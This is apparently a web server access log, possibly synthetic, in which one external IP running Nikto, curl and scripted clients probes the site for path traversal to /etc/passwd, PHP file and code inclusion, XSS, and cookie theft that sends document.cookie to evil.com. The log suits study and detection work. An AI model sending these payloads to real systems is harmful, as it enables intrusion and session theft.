192.168.3.16 - - [14/Mar/2026:20:13:59 +0300] "POST /products?category=electronics HTTP/1.1" 200 7250 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.1.51 - - [14/Mar/2026:20:19:07 +0300] "GET /api/users/me HTTP/1.1" 200 581 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.2.57 - - [14/Mar/2026:20:19:11 +0300] "GET /sitemap.xml HTTP/1.1" 200 2366 "https://google.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.5.53 - - [14/Mar/2026:20:19:12 +0300] "GET /products HTTP/1.1" 200 19080 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.26 - - [14/Mar/2026:20:19:13 +0300] "GET /api/items?page=1 HTTP/1.1" 404 4387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.1.26 - - [14/Mar/2026:20:19:17 +0300] "GET /products?category=electronics HTTP/1.1" 200 12159 "https://t.co/x" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.3.59 - - [14/Mar/2026:20:19:18 +0300] "GET /about-us HTTP/1.1" 200 11727 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.1.35 - - [14/Mar/2026:20:19:19 +0300] "GET /search?q=union+square+hotel HTTP/1.1" 200 3716 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.3.43 - - [14/Mar/2026:20:19:19 +0300] "GET /api/users/me HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.5.68 - - [14/Mar/2026:20:19:21 +0300] "GET /blog/post/123 HTTP/1.1" 200 6265 "https://google.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.5.48 - - [14/Mar/2026:20:19:24 +0300] "GET /blog/post/456 HTTP/1.1" 200 27482 "https://bing.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.2.37 - - [14/Mar/2026:20:19:27 +0300] "GET /products?category=electronics HTTP/1.1" 404 711 "https://t.co/x" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.51 - - [14/Mar/2026:20:19:29 +0300] "GET /sitemap.xml HTTP/1.1" 200 22199 "https://bing.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.3.28 - - [14/Mar/2026:20:19:33 +0300] "POST /docs/frontend/onload-events HTTP/1.1" 200 5709 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.5.49 - - [14/Mar/2026:20:19:35 +0300] "GET /api/search HTTP/1.1" 200 2734 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.5.47 - - [14/Mar/2026:20:19:38 +0300] "GET /index.html HTTP/1.1" 200 1509 "https://bing.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.5.53 - - [14/Mar/2026:20:19:42 +0300] "GET /docs/sql/select-basics HTTP/1.1" 200 7233 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.58 - - [14/Mar/2026:20:19:46 +0300] "GET /api/users/me HTTP/1.1" 200 1842 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.5.10 - - [14/Mar/2026:20:19:51 +0300] "GET /index.html HTTP/1.1" 200 12601 "https://t.co/x" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.5.40 - - [14/Mar/2026:20:19:52 +0300] "GET /login HTTP/1.1" 200 7623 "https://bing.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.4.52 - - [14/Mar/2026:20:19:56 +0300] "HEAD /docs/api HTTP/1.1" 404 6354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.5.13 - - [14/Mar/2026:20:19:57 +0300] "GET /favicon.ico HTTP/1.1" 200 19030 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.3.19 - - [14/Mar/2026:20:20:00 +0300] "GET /api/search?q=script+tag+tutorial HTTP/1.1" 200 4956 "https://google.com/" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.5.53 - - [14/Mar/2026:20:20:03 +0300] "GET /help HTTP/1.1" 200 6568 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.3.63 - - [14/Mar/2026:20:20:04 +0300] "GET /api/search?q=script+tag+tutorial HTTP/1.1" 200 8689 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.1.46 - - [14/Mar/2026:20:20:08 +0300] "GET /cart HTTP/1.1" 200 2737 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.5.49 - - [14/Mar/2026:20:20:12 +0300] "GET /static/app.js HTTP/1.1" 200 16495 "https://google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.2.15 - - [14/Mar/2026:20:20:14 +0300] "GET /index.html HTTP/1.1" 200 27110 "https://google.com/" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.4.20 - - [14/Mar/2026:20:20:17 +0300] "GET /blog HTTP/1.1" 200 26766 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.3.39 - - [14/Mar/2026:20:20:18 +0300] "GET /static/app.js HTTP/1.1" 200 16874 "https://google.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.3.66 - - [14/Mar/2026:20:20:20 +0300] "GET /api/items HTTP/1.1" 200 3065 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.4.30 - - [14/Mar/2026:20:20:24 +0300] "GET /blog/post/456 HTTP/1.1" 200 7609 "https://google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.4.61 - - [14/Mar/2026:20:20:28 +0300] "GET /docs HTTP/1.1" 301 20713 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.5.45 - - [14/Mar/2026:20:20:29 +0300] "GET /products?sort=order+by+price HTTP/1.1" 200 10299 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.4.52 - - [14/Mar/2026:20:20:30 +0300] "GET /api/search?q=script+tag+tutorial HTTP/1.1" 200 10612 "https://t.co/x" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.5.48 - - [14/Mar/2026:20:20:33 +0300] "GET /docs/api HTTP/1.1" 200 16129 "https://bing.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.3.43 - - [14/Mar/2026:20:20:35 +0300] "GET /index.html HTTP/1.1" 200 2561 "https://google.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.1.23 - - [14/Mar/2026:20:20:38 +0300] "GET /api/items HTTP/1.1" 404 10655 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.5.47 - - [14/Mar/2026:20:20:39 +0300] "GET /blog/post/456 HTTP/1.1" 200 18897 "https://google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.3.22 - - [14/Mar/2026:20:20:40 +0300] "POST /user/login HTTP/1.1" 403 7460 "https://t.co/x" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.4.36 - - [14/Mar/2026:20:20:44 +0300] "GET /static/styles.css HTTP/1.1" 304 2398 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.3.43 - - [14/Mar/2026:20:20:46 +0300] "GET /checkout HTTP/1.1" 200 15183 "https://google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.3.33 - - [14/Mar/2026:20:20:51 +0300] "GET /docs/sql/select-basics HTTP/1.1" 200 11079 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.3.66 - - [14/Mar/2026:20:20:53 +0300] "GET /docs HTTP/1.1" 200 20237 "https://bing.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.5.14 - - [14/Mar/2026:20:20:54 +0300] "GET /api/items HTTP/1.1" 200 4134 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.2.15 - - [14/Mar/2026:20:20:57 +0300] "GET /favicon.ico HTTP/1.1" 200 9430 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.3.28 - - [14/Mar/2026:20:21:00 +0300] "GET /blog/post/123 HTTP/1.1" 200 21857 "https://t.co/x" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.3.43 - - [14/Mar/2026:20:21:03 +0300] "POST /api/search?q=laptop HTTP/1.1" 200 6807 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.2.21 - - [14/Mar/2026:20:21:03 +0300] "GET /products HTTP/1.1" 200 14591 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
45.133.12.77 - - [14/Mar/2026:20:21:04 +0300] "GET /api/read?file=php://input HTTP/1.1" 500 3667 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
45.133.12.77 - - [14/Mar/2026:20:21:06 +0300] "GET /page?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1" 403 1062 "-" "curl/8.5.0"
192.168.5.42 - - [14/Mar/2026:20:21:07 +0300] "GET /cart HTTP/1.1" 301 606 "https://bing.com/" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
45.133.12.77 - - [14/Mar/2026:20:21:08 +0300] "GET /static?path=../../../../proc/self/environ HTTP/1.1" 404 3539 "-" "Go-http-client/1.1"
192.168.5.53 - - [14/Mar/2026:20:21:11 +0300] "GET /signin HTTP/1.1" 200 1676 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
45.133.12.77 - - [14/Mar/2026:20:21:12 +0300] "GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 200 1892 "-" "curl/8.5.0"
192.168.1.64 - - [14/Mar/2026:20:21:14 +0300] "GET /api/items HTTP/1.1" 200 2407 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
45.133.12.77 - - [14/Mar/2026:20:21:14 +0300] "GET /page?include=../../../../etc/passwd%00 HTTP/1.1" 403 4045 "-" "curl/8.5.0"
45.133.12.77 - - [14/Mar/2026:20:21:18 +0300] "GET /download?file=../../../../etc/passwd HTTP/1.1" 400 4372 "-" "Go-http-client/1.1"
192.168.5.47 - - [14/Mar/2026:20:21:19 +0300] "GET /api/search HTTP/1.1" 200 3941 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.133.12.77 - - [14/Mar/2026:20:21:21 +0300] "GET /page?inc=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+ HTTP/1.1" 403 1542 "-" "curl/8.5.0"
192.168.3.19 - - [14/Mar/2026:20:21:22 +0300] "GET /blog/post/456 HTTP/1.1" 404 7691 "https://t.co/x" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
45.133.12.77 - - [14/Mar/2026:20:21:24 +0300] "GET /download?file=../../../../etc/passwd%00.jpg HTTP/1.1" 403 2620 "-" "curl/8.5.0"
192.168.1.26 - - [14/Mar/2026:20:21:26 +0300] "GET /api/items HTTP/1.1" 500 11678 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
45.133.12.77 - - [14/Mar/2026:20:21:27 +0300] "GET /view?doc=../../../windows/win.ini HTTP/1.1" 403 4314 "-" "python-requests/2.31.0"
192.168.5.47 - - [14/Mar/2026:20:21:28 +0300] "GET /api/search?q=laptop HTTP/1.1" 200 8505 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.4.52 - - [14/Mar/2026:20:21:29 +0300] "POST /account/login HTTP/1.1" 401 1073 "https://bing.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.3.66 - - [14/Mar/2026:20:21:30 +0300] "GET /favicon.ico HTTP/1.1" 304 9284 "https://google.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
45.133.12.77 - - [14/Mar/2026:20:21:31 +0300] "GET /page?inc=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+ HTTP/1.1" 500 4934 "-" "curl/8.5.0"
192.168.1.50 - - [14/Mar/2026:20:21:34 +0300] "GET / HTTP/1.1" 200 17604 "https://bing.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.4.52 - - [14/Mar/2026:20:21:34 +0300] "GET /products?category=books HTTP/1.1" 200 2999 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.4.30 - - [14/Mar/2026:20:21:36 +0300] "GET /blog/post/123 HTTP/1.1" 200 14066 "https://bing.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.3.31 - - [14/Mar/2026:20:21:41 +0300] "GET /favicon.ico HTTP/1.1" 200 10615 "https://google.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.2.69 - - [14/Mar/2026:20:21:45 +0300] "GET /search?q=%3C3+sale HTTP/1.1" 301 11542 "https://t.co/x" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.5.40 - - [14/Mar/2026:20:21:47 +0300] "GET /blog HTTP/1.1" 200 16149 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.5.34 - - [14/Mar/2026:20:21:48 +0300] "POST /docs/sql/select-basics HTTP/1.1" 301 4362 "https://t.co/x" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.5.27 - - [14/Mar/2026:20:21:52 +0300] "GET /products?sort=order+by+price HTTP/1.1" 200 4139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.5.49 - - [14/Mar/2026:20:21:54 +0300] "GET /search?q=phone HTTP/1.1" 200 3646 "https://t.co/x" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.1.51 - - [14/Mar/2026:20:21:56 +0300] "GET /products HTTP/1.1" 200 18257 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.1.58 - - [14/Mar/2026:20:22:00 +0300] "GET /settings HTTP/1.1" 200 2061 "https://t.co/x" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.3.28 - - [14/Mar/2026:20:22:04 +0300] "GET /sitemap.xml HTTP/1.1" 200 22361 "https://google.com/" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.5.10 - - [14/Mar/2026:20:22:07 +0300] "GET /docs HTTP/1.1" 200 15319 "https://t.co/x" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.4.61 - - [14/Mar/2026:20:22:09 +0300] "GET /api/items?page=2&limit=20 HTTP/1.1" 200 4135 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.2.37 - - [14/Mar/2026:20:22:10 +0300] "GET /api/items HTTP/1.1" 304 1033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.2.69 - - [14/Mar/2026:20:22:12 +0300] "GET /about HTTP/1.1" 200 25319 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.4.36 - - [14/Mar/2026:20:22:15 +0300] "GET /api/search HTTP/1.1" 200 9100 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.3.59 - - [14/Mar/2026:20:22:20 +0300] "GET /api/items HTTP/1.1" 200 6669 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.1.32 - - [14/Mar/2026:20:22:24 +0300] "GET /api/items?page=2&limit=20 HTTP/1.1" 200 7236 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.5.14 - - [14/Mar/2026:20:22:27 +0300] "GET /checkout HTTP/1.1" 200 4195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.1.55 - - [14/Mar/2026:20:22:29 +0300] "GET /faq HTTP/1.1" 200 3165 "-" "AhrefsBot/7.0 (+http://ahrefs.com/robot/)"
192.168.3.66 - - [14/Mar/2026:20:22:30 +0300] "GET /robots.txt HTTP/1.1" 200 9750 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.3.66 - - [14/Mar/2026:20:22:30 +0300] "GET /sitemap.xml HTTP/1.1" 200 15166 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.5.48 - - [14/Mar/2026:20:22:33 +0300] "GET /search?q=phone HTTP/1.1" 200 11049 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.133.12.77 - - [14/Mar/2026:20:22:35 +0300] "GET /redirect?next=javascript:alert(1) HTTP/1.1" 500 1781 "-" "Nikto/2.1.6"
45.133.12.77 - - [14/Mar/2026:20:22:36 +0300] "GET /search?q=<script>alert(document.domain)</script> HTTP/1.1" 500 928 "-" "curl/8.5.0"
192.168.5.14 - - [14/Mar/2026:20:22:38 +0300] "GET /api/users/me HTTP/1.1" 200 1205 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
45.133.12.77 - - [14/Mar/2026:20:22:38 +0300] "GET /comments?text=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E HTTP/1.1" 500 1912 "-" "Nikto/2.1.6"
192.168.1.51 - - [14/Mar/2026:20:22:40 +0300] "POST /user/login HTTP/1.1" 401 1790 "https://google.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
45.133.12.77 - - [14/Mar/2026:20:22:42 +0300] "POST /comments?link=javascript:void(fetch('//evil.com?c='+document.cookie)) HTTP/1.1" 200 1848 "-" "Nikto/2.1.6"
192.168.3.19 - - [14/Mar/2026:20:22:43 +0300] "GET /products?category=electronics HTTP/1.1" 200 5291 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.133.12.77 - - [14/Mar/2026:20:22:43 +0300] "GET /search?q=${7*7} HTTP/1.1" 200 1572 "-" "Nikto/2.1.6"
192.168.1.64 - - [14/Mar/2026:20:22:47 +0300] "POST /auth/login HTTP/1.1" 302 5130 "https://bing.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
45.133.12.77 - - [14/Mar/2026:20:22:48 +0300] "POST /search?q=<body onload=alert('xss')> HTTP/1.1" 200 933 "-" "Nikto/2.1.6"
45.133.12.77 - - [14/Mar/2026:20:22:50 +0300] "POST /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1" 400 959 "-" "Nikto/2.1.6"
192.168.5.40 - - [14/Mar/2026:20:22:51 +0300] "GET /docs/api HTTP/1.1" 200 20276 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.3.22 - - [14/Mar/2026:20:22:53 +0300] "GET /products?category=electronics HTTP/1.1" 200 16141 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.1.55 - - [14/Mar/2026:20:22:54 +0300] "GET /search?q=select+phone HTTP/1.1" 200 549 "https://google.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
45.133.12.77 - - [14/Mar/2026:20:22:54 +0300] "GET /api/name?v=<input autofocus onfocus=alert(1)> HTTP/1.1" 400 1462 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.4.25 - - [14/Mar/2026:20:22:56 +0300] "GET /api/users/me HTTP/1.1" 200 1465 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
45.133.12.77 - - [14/Mar/2026:20:22:57 +0300] "GET /api/feedback?msg=<script>new Image().src='//evil.com/?c='+document.cookie</script> HTTP/1.1" 403 403 "-" "curl/8.5.0"
192.168.5.14 - - [14/Mar/2026:20:23:01 +0300] "GET /index.html HTTP/1.1" 200 26259 "https://t.co/x" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.4.61 - - [14/Mar/2026:20:23:01 +0300] "GET /contact HTTP/1.1" 200 18050 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
45.133.12.77 - - [14/Mar/2026:20:23:02 +0300] "GET /comments?msg=<a href=javascript:alert(1)>click</a> HTTP/1.1" 200 412 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.5.10 - - [14/Mar/2026:20:23:03 +0300] "GET /search?q=select+phone HTTP/1.1" 200 5143 "https://t.co/x" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.4.24 - - [14/Mar/2026:20:23:05 +0300] "GET /signin HTTP/1.1" 200 5844 "https://google.com/" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
45.133.12.77 - - [14/Mar/2026:20:23:06 +0300] "GET /comments?link=javascript:void(fetch('//evil.com?c='+document.cookie)) HTTP/1.1" 403 1683 "-" "Nikto/2.1.6"
192.168.3.16 - - [14/Mar/2026:20:23:09 +0300] "GET /checkout HTTP/1.1" 200 7485 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
45.133.12.77 - - [14/Mar/2026:20:23:09 +0300] "POST /comments?text=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E HTTP/1.1" 403 525 "-" "Nikto/2.1.6"
